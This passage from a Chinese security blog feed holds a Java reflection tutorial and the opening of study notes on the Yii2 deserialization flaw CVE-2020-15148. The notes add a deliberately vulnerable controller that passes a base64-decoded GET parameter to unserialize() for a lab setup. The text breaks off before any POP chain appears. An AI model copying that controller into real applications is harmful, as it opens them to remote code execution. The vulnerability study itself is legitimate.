class="string">&quot;reflection.Student&quot;</span>);</span><br><span class="line">        System.out.println(c2.hashCode());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式三：通过类名.class获取</span></span><br><span class="line">        Class c3 = Student.class;</span><br><span class="line">        System.out.println(c3.hashCode());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式四：基本内置数据类型的包装类有一个TYPE属性</span></span><br><span class="line">        Class c4 = Integer.TYPE;</span><br><span class="line">        System.out.println(c4);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取父类的class对象</span></span><br><span class="line">        Class c5 = c1.getSuperclass();</span><br><span class="line">        System.out.println(c5);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;nobody&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> no;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, no=&quot;</span> + no +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-5-哪些类型有类对象"><a href="#1-5-哪些类型有类对象" class="headerlink" title="1.5 哪些类型有类对象"></a>1.5 哪些类型有类对象</h3><ul><li>class</li><li>interface 接口</li><li>[]数组</li><li>enum 枚举</li><li>annotation 注解</li><li>primitive type 基本数据类型</li><li>void</li></ul><h3 id="1-6-Java内存图分析反射"><a href="#1-6-Java内存图分析反射" class="headerlink" title="1.6 Java内存图分析反射"></a>1.6 Java内存图分析反射</h3><ol><li>类的加载（Load）：类加载器完成。从.class文件中加载类，创建java.lang.Class对象。</li><li>类的链接（Link）：确保类信息符合JVM规范，将类的类变量分配内存，存放到相应的堆栈内存中，符号引用替换为引用地址。</li><li>类的初始化（Initialize）：JVM调用类构造器的<code>&lt;clinit&gt;()</code>方法对类进行初始化，初始化过程将可合并的语句进行合并，并触发父类的初始化。</li></ol><p><img src="http://image.v0w.top/2020/12/16075687581263.jpg"></p><h2 id="0x02-Java反射有哪些作用"><a href="#0x02-Java反射有哪些作用" class="headerlink" title="0x02 Java反射有哪些作用"></a>0x02 Java反射有哪些作用</h2><h3 id="2-1-Java反射的作用"><a href="#2-1-Java反射的作用" class="headerlink" title="2.1 Java反射的作用"></a>2.1 Java反射的作用</h3><ol><li>通过反射获取运行时，类的完整结构，包括属性和方法</li><li>对类的一些属性和方法进行修改，包括可以修改私有属性</li><li>动态创建对象，执行实例化对象的方法</li></ol><p>下面举几个例子</p><h3 id="2-2-获取类的所有变量信息"><a href="#2-2-获取类的所有变量信息" class="headerlink" title="2.2 获取类的所有变量信息"></a>2.2 获取类的所有变量信息</h3><p>FatherClass</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FatherClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String mFatherName;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mFatherAge;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printFatherMsg</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SonClass</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SonClass</span> <span class="keyword">extends</span> <span class="title">FatherClass</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String mSonName;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> mSonAge;</span><br><span class="line">    <span class="keyword">public</span> String mSonBirthday;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printSonMsg</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Son Msg - name : &quot;</span></span><br><span class="line">                + mSonName + <span class="string">&quot;; age : &quot;</span> + mSonAge);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setSonName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        mSonName = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setSonAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        mSonAge = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getSonAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mSonAge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getSonName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mSonName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainTest</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过反射获取类的所有变量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printFields</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//1.获取并输出类的名称</span></span><br><span class="line">        Class mClass = SonClass.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;类的名称：&quot;</span> + mClass.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.1 获取所有 public 访问权限的变量，包含父类中的public变量</span></span><br><span class="line">        <span class="comment">// 包括本类声明的和从父类继承的</span></span><br><span class="line">        Field[] fields = mClass.getFields();</span><br><span class="line">        System.out.println(<span class="string">&quot;public 变量：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Field field :</span><br><span class="line">                fields) &#123;</span><br><span class="line">            <span class="comment">//获取访问权限并输出</span></span><br><span class="line">            <span class="keyword">int</span> modifiers = field.getModifiers();</span><br><span class="line">            System.out.print(Modifier.toString(modifiers) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">//输出变量的类型及变量名</span></span><br><span class="line">            System.out.println(field.getType().getName()</span><br><span class="line">                    + <span class="string">&quot; &quot;</span> + field.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.2 获取所有本类声明的变量（不问访问权限）但是这个只有本类的，不包含父类变量</span></span><br><span class="line">        fields = mClass.getDeclaredFields();</span><br><span class="line">        System.out.println(<span class="string">&quot;全部变量：&quot;</span>);</span><br><span class="line">        <span class="comment">//3. 遍历变量并输出变量信息</span></span><br><span class="line">        <span class="keyword">for</span> (Field field :</span><br><span class="line">                fields) &#123;</span><br><span class="line">            <span class="comment">//获取访问权限并输出</span></span><br><span class="line">            <span class="keyword">int</span> modifiers = field.getModifiers();</span><br><span class="line">            System.out.print(Modifier.toString(modifiers) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">//输出变量的类型及变量名</span></span><br><span class="line">            System.out.println(field.getType().getName()</span><br><span class="line">                    + <span class="string">&quot; &quot;</span> + field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        printFields();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">类的名称：reflection.SonClass</span><br><span class="line"></span><br><span class="line">public 变量-getFields()：</span><br><span class="line">public java.lang.String mSonBirthday</span><br><span class="line">public java.lang.String mFatherName</span><br><span class="line">public int mFatherAge</span><br><span class="line"></span><br><span class="line">全部变量-getDeclaredFields()：</span><br><span class="line">private java.lang.String mSonName</span><br><span class="line">protected int mSonAge</span><br><span class="line">public java.lang.String mSonBirthday</span><br></pre></td></tr></table></figure><p>可以发现：我们可以通过反射来获取类的变量，注意两个函数的区别：</p><ul><li>调用 <code>getFields()</code> 方法，输出 SonClass 类以及其所继承的父类( 包括 FatherClass 和 Object ) 的 public 方法。注：Object 类中没有成员变量，所以没有输出。</li><li>调用 <code>getDeclaredFields()</code> ， 输出 SonClass 类的所有成员变量，不问访问权限。</li></ul><h3 id="2-3-获取类的方法信息"><a href="#2-3-获取类的方法信息" class="headerlink" title="2.3 获取类的方法信息"></a>2.3 获取类的方法信息</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过反射获取类的所有方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMethods</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//1.获取并输出类的名称</span></span><br><span class="line">        Class mClass = SonClass.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;类的名称：&quot;</span> + mClass.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.1 获取所有 public 访问权限的方法</span></span><br><span class="line">        <span class="comment">//包括自己声明和从父类继承的</span></span><br><span class="line">        Method[] mMethods = mClass.getMethods();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.2 获取所有本类的的方法（不问访问权限）</span></span><br><span class="line">        <span class="comment">//Method[] mMethods = mClass.getDeclaredMethods();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.遍历所有方法</span></span><br><span class="line">        <span class="keyword">for</span> (Method method :</span><br><span class="line">                mMethods) &#123;</span><br><span class="line">            <span class="comment">//获取并输出方法的访问权限（Modifiers：修饰符）</span></span><br><span class="line">            <span class="keyword">int</span> modifiers = method.getModifiers();</span><br><span class="line">            System.out.print(Modifier.toString(modifiers) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">//获取并输出方法的返回值类型</span></span><br><span class="line">            Class returnType = method.getReturnType();</span><br><span class="line">            System.out.print(returnType.getName() + <span class="string">&quot; &quot;</span></span><br><span class="line">                    + method.getName() + <span class="string">&quot;( &quot;</span>);</span><br><span class="line">            <span class="comment">//获取并输出方法的所有参数</span></span><br><span class="line">            Parameter[] parameters = method.getParameters();</span><br><span class="line">            <span class="keyword">for</span> (Parameter parameter:</span><br><span class="line">                    parameters) &#123;</span><br><span class="line">                System.out.print(parameter.getType().getName()</span><br><span class="line">                        + <span class="string">&quot; &quot;</span> + parameter.getName() + <span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//获取并输出方法抛出的异常</span></span><br><span class="line">            Class[] exceptionTypes = method.getExceptionTypes();</span><br><span class="line">            <span class="keyword">if</span> (exceptionTypes.length == <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot; )&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (Class c : exceptionTypes) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot; ) throws &quot;</span></span><br><span class="line">                            + c.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>调用 getMethods() 方法<br>获取 SonClass 类所有 public 访问权限的方法，包括从父类继承的。打印信息中，printSonMsg() 方法来自 SonClass 类， printFatherMsg() 来自 FatherClass 类，其余方法来自 Object 类。</p>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">类的名称：obj.SonClass</span><br><span class="line">public void printSonMsg(  )</span><br><span class="line">public void printFatherMsg(  )</span><br><span class="line">public final void wait(  ) throws java.lang.InterruptedException</span><br><span class="line">public final void wait( long arg0,int arg1, ) throws java.lang.InterruptedException</span><br><span class="line">public final native void wait( long arg0, ) throws java.lang.InterruptedException</span><br><span class="line">public boolean equals( java.lang.Object arg0, )</span><br><span class="line">public java.lang.String toString(  )</span><br><span class="line">public native int hashCode(  )</span><br><span class="line">public final native java.lang.Class getClass(  )</span><br><span class="line">public final native void notify(  )</span><br><span class="line">public final native void notifyAll(  )</span><br></pre></td></tr></table></figure></li><li><p>调用 getDeclaredMethods() 方法<br>打印信息中，输出的都是 SonClass 类的方法，不问访问权限。<br>类的名称：obj.SonClass</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getSonAge</span><span class="params">(  )</span></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setSonAge</span><span class="params">( <span class="keyword">int</span> arg0, )</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printSonMsg</span><span class="params">(  )</span></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setSonName</span><span class="params">( java.lang.String arg0, )</span></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> java.lang.String <span class="title">getSonName</span><span class="params">(  )</span></span></span><br></pre></td></tr></table></figure></li></ul><h3 id="2-4-利用反射直接调用私有变量和私有方法"><a href="#2-4-利用反射直接调用私有变量和私有方法" class="headerlink" title="2.4 利用反射直接调用私有变量和私有方法"></a>2.4 利用反射直接调用私有变量和私有方法</h3><p>在上面，我们成功获取了类的变量和方法信息，验证了在运行时 动态的获取信息 的观点。那么，仅仅是获取信息吗？我们接着往后看。<br>都知道，对象是无法访问或操作类的私有变量和方法的，但是，通过反射，我们就可以做到。没错，反射可以做到！下面，让我们一起探讨如何利用反射访问 类对象的私有方法 以及修改 私有变量或常量。</p><p>TestClass.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String MSG = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">privateMethod</span><span class="params">(String head , <span class="keyword">int</span> tail)</span></span>&#123;</span><br><span class="line">        System.out.print(head + tail);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMsg</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> MSG;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-访问私有方法"><a href="#2-5-访问私有方法" class="headerlink" title="2.5 访问私有方法"></a>2.5 访问私有方法</h3><p>以访问 TestClass 类中的私有方法 privateMethod(…) 为例，方法加参数是为了考虑最全的情况。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问对象的私有方法</span></span><br><span class="line"><span class="comment"> * 为简洁代码，在方法上抛出总的异常，实际开发别这样</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getPrivateMethod</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//1. 获取 Class 类实例</span></span><br><span class="line">    TestClass testClass = <span class="keyword">new</span> TestClass();</span><br><span class="line">    Class mClass = testClass.getClass();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//2. 获取私有方法</span></span><br><span class="line">    <span class="comment">//第一个参数为要获取的私有方法的名称</span></span><br><span class="line">    <span class="comment">//第二个为要获取方法的参数的类型，参数为 Class...，没有参数就是null</span></span><br><span class="line">    <span class="comment">//方法参数也可这么写 ：new Class[]&#123;String.class , int.class&#125;</span></span><br><span class="line">    Method privateMethod =</span><br><span class="line">            mClass.getDeclaredMethod(<span class="string">&quot;privateMethod&quot;</span>, String.class, <span class="keyword">int</span>.class);</span><br><span class="line">            </span><br><span class="line">    <span class="comment">//3. 开始操作方法</span></span><br><span class="line">    <span class="keyword">if</span> (privateMethod != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//获取私有方法的访问权</span></span><br><span class="line">        <span class="comment">//只是获取访问权，并不是修改实际权限</span></span><br><span class="line">        privateMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//使用 invoke 反射调用私有方法</span></span><br><span class="line">        <span class="comment">//privateMethod 是获取到的私有方法</span></span><br><span class="line">        <span class="comment">//testClass 要操作的对象</span></span><br><span class="line">        <span class="comment">//后面两个参数传实参</span></span><br><span class="line">        privateMethod.invoke(testClass, <span class="string">&quot;Java Reflect &quot;</span>, <span class="number">666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，第3步中的 setAccessible(true) 方法，是获取私有方法的访问权限，如果不加会报异常 IllegalAccessException，因为当前方法访问权限是<strong>private</strong>的，如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.IllegalAccessException: Class MainClass can not access a member of class obj.TestClass with modifiers &quot;private&quot;</span><br></pre></td></tr></table></figure><p>正常运行后，打印如下，调用私有方法成功：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java Reflect 666</span><br></pre></td></tr></table></figure><h3 id="2-6-修改私有变量"><a href="#2-6-修改私有变量" class="headerlink" title="2.6 修改私有变量"></a>2.6 修改私有变量</h3><p>以修改 TestClass 类中的私有变量 MSG 为例，其初始值为 “Original” ，我们要修改为 “Modified”。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 修改对象私有变量的值</span></span><br><span class="line"><span class="comment"> * 为简洁代码，在方法上抛出总的异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">modifyPrivateFiled</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//1. 获取 Class 类实例</span></span><br><span class="line">    TestClass testClass = <span class="keyword">new</span> TestClass();</span><br><span class="line">    Class mClass = testClass.getClass();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//2. 获取私有变量</span></span><br><span class="line">    Field privateField = mClass.getDeclaredField(<span class="string">&quot;MSG&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//3. 操作私有变量</span></span><br><span class="line">    <span class="keyword">if</span> (privateField != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//获取私有变量的访问权</span></span><br><span class="line">        privateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//修改私有变量，并输出以测试</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Before Modify：MSG = &quot;</span> + testClass.getMsg());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//调用 set(object , value) 修改变量的值</span></span><br><span class="line">        <span class="comment">//privateField 是获取到的私有变量</span></span><br><span class="line">        <span class="comment">//testClass 要操作的对象</span></span><br><span class="line">        <span class="comment">//&quot;Modified&quot; 为要修改成的值</span></span><br><span class="line">        privateField.set(testClass, <span class="string">&quot;Modified&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;After Modify：MSG = &quot;</span> + testClass.getMsg());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处代码和访问私有方法的逻辑差不多，从输出信息看出 修改私有变量 成功：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Before Modify：MSG &#x3D; Original</span><br><span class="line">After Modify：MSG &#x3D; Modified</span><br></pre></td></tr></table></figure><h3 id="2-7-利用反射创建对象调用方法"><a href="#2-7-利用反射创建对象调用方法" class="headerlink" title="2.7 利用反射创建对象调用方法"></a>2.7 利用反射创建对象调用方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过反射，动态创建对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException </span>&#123;</span><br><span class="line">        <span class="comment">//获取Class对象</span></span><br><span class="line">        Class c1 = Class.forName(<span class="string">&quot;reflection.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用Class对象来构造对象</span></span><br><span class="line">        User user1 = (User)c1.newInstance();</span><br><span class="line">        System.out.println(user1);</span><br><span class="line">        <span class="comment">// User&#123;name=&#x27;null&#x27;, age=0, no=0&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用class对象的构造器，进行有参构造</span></span><br><span class="line">        Constructor declaredConstructor = c1.getDeclaredConstructor(String.class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        User user2 = (User)declaredConstructor.newInstance(<span class="string">&quot;V0W&quot;</span>,<span class="number">18</span>,<span class="number">123</span>);</span><br><span class="line">        System.out.println(user2);</span><br><span class="line">        <span class="comment">//User&#123;name=&#x27;V0W&#x27;, age=18, no=123&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射调用对象的方法</span></span><br><span class="line">        User user3 = (User) c1.newInstance();</span><br><span class="line">        Method setName = c1.getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        setName.invoke(user3,<span class="string">&quot;V0Wtest&quot;</span>);</span><br><span class="line">        System.out.println(user3.getName());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;===============================&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射操作属性</span></span><br><span class="line">        User user4 = (User) c1.newInstance();</span><br><span class="line">        Field name = c1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);     <span class="comment">// 允许私有属性的访问</span></span><br><span class="line">        name.set(user4,<span class="string">&quot;V0W4&quot;</span>); <span class="comment">// 由于name是private，直接赋值，权限不够，can not access</span></span><br><span class="line">        System.out.println(user4.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h2><ul><li><a href="https://juejin.cn/post/6844904005294882830">Java 反射由浅入深 | 进阶必备</a></li><li><a href="https://www.jianshu.com/p/356e1d7a9d11">Java反射：这是一份全面 &amp; 详细的 Java反射机制 学习指南</a></li><li><a href="https://www.bilibili.com/video/BV1p4411P7V3">狂神说Java-注解和反射</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java反射机制&quot;&gt;&lt;a href=&quot;#Java反射机制&quot; class=&quot;headerlink&quot; title=&quot;Java反射机制&quot;&gt;&lt;/a&gt;Java反射机制&lt;/h1&gt;&lt;h2 id=&quot;0x01-一些概念-amp-类对象&quot;&gt;&lt;a href=&quot;#0x01-一些概念-am</summary>
      
    
    
    
    <category term="编程算法" scheme="http://v0w.top/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="Java" scheme="http://v0w.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Yii2 反序列化（CVE-2020-15148）学习笔记</title>
    <link href="http://v0w.top/2020/09/22/Yii2unserialize/"/>
    <id>http://v0w.top/2020/09/22/Yii2unserialize/</id>
    <published>2020-09-21T16:00:00.000Z</published>
    <updated>2020-12-22T12:56:44.226Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>HW期间爆出的Yii2漏洞，分别在9月19日进行复现，9月22日研究新的POC，并且尝试自己挖掘POP链。</p><p><strong>影响范围</strong></p><ul><li>Yii2 &lt; 2.0.38</li></ul><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><h2 id="1-1-环境搭建"><a href="#1-1-环境搭建" class="headerlink" title="1.1 环境搭建"></a>1.1 环境搭建</h2><p>我是github下载的源码，利用MAMP构建。</p><p>选择一个存在漏洞的版本：<a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a></p><p>解压到Web目录，然后修改一下配置文件。<br><code>/config/web.php</code>:给<code>cookieValidationKey</code>字段设置一个值（随便什么值）作为<code>yii\web\Request::cookieValidationKey</code>的加密值，不设置会报错如下图所示：</p><p><img src="http://image.v0w.top/Blog/2020-09-22-171609.jpg"></p><p>接着添加一个存在漏洞的Action:<code>/controllers/TestController.php</code>:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Yii</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $name = Yii::$app-&gt;request-&gt;get(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> unserialize(base64_decode($name));    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试成功，完成环境搭建。</p><p><img src="http://image.v0w.top/Blog/2020-09-22-194105.jpg"></p><h2 id="1-2-漏洞分析与第一条POP链"><a href="#1-2-漏洞分析与第一条POP链" class="headerlink" title="1.2 漏洞分析与第一条POP链"></a>1.2 漏洞分析与第一条POP链</h2><p>漏洞入口点定位在：<code>/vendor/yiisoft/yii2/db/BatchQueryResult.php :line79-98</code></p><p><img 